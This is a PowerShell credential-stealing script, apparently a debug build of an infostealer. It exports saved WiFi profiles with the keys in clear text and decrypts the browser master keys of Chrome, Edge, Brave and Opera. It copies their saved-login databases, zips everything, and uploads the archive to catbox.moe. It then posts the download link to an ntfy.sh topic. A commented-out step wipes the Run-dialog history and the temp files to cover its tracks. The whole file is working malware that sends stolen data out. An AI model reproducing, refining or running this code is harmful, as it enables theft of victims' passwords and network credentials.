$topic = "data_stwealer_hideen_"

Write-Host "--- DEBUG START ---" -ForegroundColor Cyan

# 1. Setup & Library Load
try {
    Add-Type -AssemblyName System.Security -ErrorAction Stop
    Write-Host "[+] Security DLL Loaded" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to load Security DLL: $($_.Exception.Message)" -ForegroundColor Red
}

$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
Write-Host "[+] Folders Created at $dir"

# 2. WiFi Export
Write-Host "[*] Exporting WiFi..."
netsh wlan export profile folder=$dir key=clear | Out-Null
Write-Host "[+] WiFi Export Done"

# 3. Browser Looting
$chromes = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    if (Test-Path $path) {
        try {
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\${browser}_MasterKey.txt"
            
            $dbPath = $path.Replace("Local State", "Default\Login Data")
            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
            
            if (Test-Path $dbPath) {
                Copy-Item $dbPath -Destination "$dir\${browser}_LoginData.db" -Force -ErrorAction SilentlyContinue
            }
            Write-Host "    [+] Grabbed $browser" -ForegroundColor Green
        } catch { 
            Write-Host "    [-] Failed $browser : $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }
}

# 4. Packaging & Uploading
Write-Host "[*] Zipping files..."
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

Write-Host "[*] Uploading to Catbox..."
$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
    Write-Host "[+] ntfy Notification Sent"
} else {
    Write-Host "[-] UPLOAD FAILED. Response: $link" -ForegroundColor Red
}

# 5. GHOST CLEANUP (Commented out for Debugging)
# Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
# Remove-Item -Recurse -Force $dir, $zip

Write-Host "--- DEBUG FINISHED ---"
Write-Host "Window will NOT close. Check errors above."
